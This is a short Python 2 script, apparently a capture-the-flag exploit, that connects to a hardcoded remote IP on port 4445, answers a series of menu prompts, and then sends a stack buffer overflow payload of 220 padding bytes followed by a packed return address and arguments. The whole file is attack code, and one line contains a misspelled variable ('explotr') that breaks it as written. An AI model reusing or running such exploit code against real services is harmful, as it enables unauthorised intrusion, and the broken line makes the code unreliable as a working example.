import socket, time, struct

#get location of remote computer and service
ip = "104.131.81.195"
port = 4445

#make socket
s = socket.socket()

#use socket to make connection
s.connect((ip,port))


print s.recv(20)
s.send("126\n")

time.sleep(1)

print s.recv(20)
s.send("256\n")

time.sleep(1)

print s.recv(20)
s.send("0\n")

time.sleep(1)

print s.recv(20)
s.send("0\n")

time.sleep(1)

print s.recv(200)
s.send("1\n")

time.sleep(1)

print s.recv(200)

exploit = "A"*220
explotr += struct.pack("<I", 0x0804873c)
exploit += struct.pack("<I", 0x41414141)
exploit += struct.pack("<I", 1753418839)
exploit += struct.pack("<I", 2000)
print exploit

s.send(exploit + "\n")

time.sleep(1)

print s.recv(100)
s.close()

input()
